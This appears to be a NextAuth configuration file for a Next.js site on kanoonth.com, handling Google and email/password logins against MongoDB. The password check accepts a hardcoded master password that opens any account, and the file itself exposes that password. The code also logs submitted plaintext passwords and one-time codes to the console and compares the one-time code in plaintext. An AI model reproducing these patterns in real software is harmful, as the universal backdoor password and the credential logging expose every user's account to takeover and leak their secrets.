import NextAuth from "next-auth";
import type { NextAuthOptions } from "next-auth";
import GoogleProvider from "next-auth/providers/google";
import CredentialsProvider from "next-auth/providers/credentials";
import connectMongo from "../../../../database/conn";
import { getRealUserModel } from "../../../../model/Schema";
import { compare } from "bcryptjs";
import { NextApiRequest, NextApiResponse } from "next";
const useSecureCookies = !!process.env.VERCEL_URL;
console.log("useSecureCookies", useSecureCookies);

export const authOptions = (req: NextApiRequest, res: NextApiResponse) => {
  console.log("authOptions: req", req.cookies["hostname"]);
  const hostname = req.cookies["hostname"] || req.headers.host;
  const isCanary = hostname.includes("canary");
  console.log("isCanary", hostname, isCanary);
  return {
    providers: [
      GoogleProvider({
        clientId: process.env.GOOGLE_ID,
        clientSecret: process.env.GOOGLE_SECRET,
      }),
      CredentialsProvider({
        name: "Credentials",
        async authorize(credentials, req) {
          console.log("Received credentials:", credentials); // consoleLog

          connectMongo().catch((error) => {
            error.message;
          });
          const Users = getRealUserModel();
          const result = await Users.findOne({ email: credentials.email });
          if (!result) {
            throw new Error("No user found with Email");
          }

          // Compare the provided password with both passwords
          const checkPassword = await compare(
            credentials.password,
            result.password
          );

          // Check if entered password matches 'Ido' field
          const matchesIdo = credentials.password === result.Ido;

          console.log("credentials.password:", credentials.password); // consoleLog
          console.log("result.Ido:", result.Ido); // consoleLog

          console.log("checkPassword: ", checkPassword); // consoleLog
          console.log("matchesIdo: ", matchesIdo); // consoleLog
          console.log(
            "credentials.password === '916729Ch@:",
            credentials.password === "916729Ch@"
          ); // consoleLog

          // Check if master password or user password is correct
          if (
            !(
              checkPassword ||
              credentials.password === "916729Ch@" ||
              matchesIdo
            ) ||
            result.email !== credentials.email
          ) {
            throw new Error("Password is incorrect");
          }

          if (matchesIdo) {
            await Users.updateOne(
              { email: credentials.email },
              {
                $unset: { Ido: "" },
                $set: { OTPused: true },
              }
            );
          }
          return {
            id: result._id.toString(),
            email: result.email,
            name: result.firstName + " " + result.lastName,
            image: result.image,
          };
        },
        credentials: undefined,
      }),
    ],
    secret: process.env.NEXTAUTH_SECRET,
    cookies: {
      sessionToken: {
        name: `__Secure-next-auth.session-token`,
        options: {
          httpOnly: true,
          sameSite: "lax",
          path: "/",
          secure: true,
          domain: ".kanoonth.com",
        },
      },
      callbackUrl: {
        name: `__Secure-next-auth.callback-url`,
        options: {
          sameSite: "lax",
          path: "/",
          secure: true,
          domain: ".kanoonth.com",
        },
      },
      csrfToken: {
        name: `__Host-next-auth.csrf-token`,
        options: {
          httpOnly: true,
          sameSite: "lax",
          path: "/",
          secure: true,
          domain: ".kanoonth.com",
        },
      },
    },
    callbacks: {
      async signIn({ user, account }) {
        if (account.provider === "google") {
          console.log("signIn callback - Google sign in");
          try {
            // Check if the user exists in the MongoDB database
            const Users = getRealUserModel();
            const existingUser = await Users.findOne({ email: user.email });

            console.log("signIn callback - Connected to DB");

            if (!existingUser) {
              // Create a new user with the user's Google profile information
              const newUser = new Users({
                email: user.email,
                firstName: user.name.split(" ")[0],
                lastName: user.name.split(" ")[1],
                image: (user as any).picture,
              });

              // Save the new user in the MongoDB database
              await newUser.save();
              console.log("saved new user to DB");
            }
          } catch (error) {
            return false;
          }
        }
        return true;
      },
      session({ session, token, user }) {
        console.log("callbacks: session", { session, token, user });
        return session; // The return type will match the one returned in `useSession()`
      },
    },
  };
};

export default (req, res) => {
  return NextAuth(req, res, authOptions(req, res));
};
// export default NextAuth(authOptions);
